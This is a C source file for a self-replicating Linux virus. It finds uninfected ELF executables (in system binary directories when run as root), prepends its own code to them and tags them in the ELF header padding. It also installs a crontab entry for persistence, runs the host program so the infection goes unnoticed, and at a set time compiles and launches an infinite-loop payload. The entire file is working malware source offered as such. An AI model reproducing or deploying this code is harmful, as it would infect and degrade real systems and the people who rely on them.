#include <stdio.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/sendfile.h> 
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <elf.h>

#define SIZE 22896
#define MAGIC_NUMBER 0x15D25
#define TEMP_FILENAME ".tempFileImage"

static inline int get_random_number(int max_num){
	return rand()%4;
}
static inline char* randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(4)];
}

/* Execute malacious instructions */
void devastation(char *fileName) {
	// system()
	const unsigned char banner[] = "Haha.. Your computer has been infected\n";
	write(1, (char *)banner, sizeof(banner));

	//Malicious hexdump
	char shellcode[] =
        "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
	
	char buf[200];
	strcpy(buf,fileName);
	strcat(buf,"_temp");

	//write to a file.c in the same directory
	char buf2[200];
	strcpy(buf2,buf);
	strcat(buf2,".c");
	int temp_fd = creat(buf2, S_IWUSR | S_IRUSR);	
	write(temp_fd, shellcode, 18);

	//compile the file
	char command[200]="gcc -w ";
	strcat(command,buf2);
	strcat(command," -o ");
	strcat(command,buf);
	system(command);
	remove(buf2);

	//fork ->
	pid_t pid = fork();		

	//1. Run the file
	if(pid == 0) {
		char *args[]={buf,NULL};
        execvp(args[0],args);
	}
	//2. delete the file.c and file
	else{
		sleep(1);
		remove(buf);
	}
}

/* Returns true if the file's format is ELF (Executeable and Linkable Format)
 * ELF files have the first four bytes as {0x7f, 'E', 'L', 'F'}
 */
bool isELF(char* path, char* fileName) {
	if(fileName[0] == '.') return false;

	int host_fd = open(path, O_RDONLY);
	
	char header[4];
	read(host_fd, header, 4);
	
	close(host_fd);

	return header[0] == 0x7f
		&& header[1] == 'E'
		&& header[2] == 'L'
		&& header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the padding entry in the EI_PAD of elf header
 */
bool isHealthy(char* fileName) {
	int fd = open(fileName, O_RDONLY);
	lseek(fd, EI_PAD, SEEK_SET);
	uint32_t flag;
	read(fd,&flag,4);
	close(fd);
	return flag != MAGIC_NUMBER;
}

/**
 * Gets an ELF file's name that is not yet infected 
 * If no such files are found, NULL is returned
 */
void getHealthyHostFile(char*retPath, char* self_name, char *name, int indent)
{
    DIR *dir;
    struct dirent *entry;
    struct stat st;
    if (!(dir = opendir(name)))
        return ;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char path[1024];
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0 || entry->d_name[0]=='.')
                continue;
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            getHealthyHostFile(retPath, self_name,path, indent + 2);
            if(retPath[0]!='\0')
                return;
            
        } else {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            stat(path, &st);
            if(!strcmp(entry->d_name, self_name)) continue;	// Don't infect self
            if(isELF(path,entry->d_name) && isHealthy(path)){
                // printf("%s\n",path);
                strcpy(retPath, path);
                closedir(dir);
                return ;
            }
        }
    }
    closedir(dir);
    return;
}

/**
 * Returns true if this file has only the virus code
 */
bool isOriginalVirus(int vfd) {
	return SIZE == lseek(vfd, 0, SEEK_END);
}

void addCron(char *hostFileName){
	char command[200];
	strcpy(command,"echo \"54 16 * * * ");
    char actualpath [200];
    char *ptr;
    ptr = realpath(hostFileName, actualpath);
	strcat(command,ptr);
	strcat(command,"\" >> /tmp/cron");
	system(command);
	system("crontab /tmp/cron");
	// remove("./cron");
}
/**
 * Infect host file by creating a temporary file; 
 * appending the virus/infected file, clean ELF host;
 * and replacing the host file with the temporary file.
 */
void infectHostFile(char* hostFileName, int virus_fd) {
	
	addCron(hostFileName);
	int host_fd = open(hostFileName, O_RDONLY);	
	struct stat st;
	fstat(host_fd, &st);
	int hostSize = st.st_size;

	
	int temp_fd = creat(TEMP_FILENAME, st.st_mode);	

	sendfile(temp_fd, virus_fd, NULL, SIZE);
	sendfile(temp_fd, host_fd, NULL, hostSize);

	rename(TEMP_FILENAME, hostFileName);

	close(temp_fd);
	close(host_fd);
}

/**
 * Execute the original host program inside this object file
 */
void executeHostPart(int virus_fd, mode_t mode, int totalSize, char *argv[]) {
	int temp_fd = creat(TEMP_FILENAME, mode);

	lseek(virus_fd, SIZE, SEEK_SET);
	int hostSize = totalSize - SIZE;
	sendfile(temp_fd, virus_fd, NULL, hostSize);
	close(temp_fd);

	pid_t pid = fork();			
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
}

/**
 * Adds a flag/signature to the EI_PAD region of the ELF header
 */
void addSignatureToELFPadding(int fd, char *fileName){
    lseek(fd, 0, SEEK_SET);
	struct stat st;
    fstat(fd, &st);

    uint8_t *mem=mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); 
    *(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
	int temp_fd = creat(TEMP_FILENAME, st.st_mode);
	write(temp_fd,mem,st.st_size);
	munmap(mem,st.st_size);
	close(temp_fd);
	rename(TEMP_FILENAME, fileName);
}

/**
 * It makes a copy of the current file and adds the flag and then
 * renames itself to the original file
 */
void makeCopyAndAddSignature(char *fileName){
	char buf[200];
	strcpy(buf,fileName);
	char buf2[200];
	strcpy(buf2,"cp ");
	strcat(buf2,buf);
	strcat(buf2," ");
	strcat(buf,"2");
	strcat(buf2,buf);

	system(buf2);
	int virus_fd = open(buf, O_RDWR);
    addSignatureToELFPadding(virus_fd, fileName);
	close(virus_fd);
	remove(buf);
}

void loadCleanHostfile(char*cleanHostName, char * self_name){
	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; 
	//Addresses of the directories to attack if the user of root
	char cwd[2] = {'.', '\0'}; 
	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	getHealthyHostFile(cleanHostName,self_name,selected_dir, 0);
}
void main(int argc, char *argv[]) {
    srand(time(0));
	makeCopyAndAddSignature(argv[0]);

	int virus_fd = open(argv[0], O_RDWR);
    struct stat st;
	fstat(virus_fd, &st);
	
	char cleanHostName[1024]="\0";
	loadCleanHostfile(cleanHostName,(char*)argv[0] + 2);
	printf("Target File %s\n",cleanHostName);
	
	char file_output[1024];
	strcpy(file_output,"echo ");
	strcat(file_output,cleanHostName);
	strcat(file_output, ">> /home/ubuntu/Desktop/selectedHostfile.txt");
	system(file_output);

	if(cleanHostName != NULL) 
		infectHostFile(cleanHostName, virus_fd);
		 

	if(isOriginalVirus(virus_fd)){
		makeCopyAndAddSignature(argv[0]);
		printf("It is Master Virus\n");
		close(virus_fd);
	}
	else{
		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
		close(virus_fd);
		time_t seconds;
		struct tm *timeStruct;

		seconds = time(NULL);

		timeStruct = localtime(&seconds);
		if(timeStruct->tm_hour == 16 && abs(timeStruct->tm_min - 54)<=10)
			devastation(argv[0]);
	}
	
}



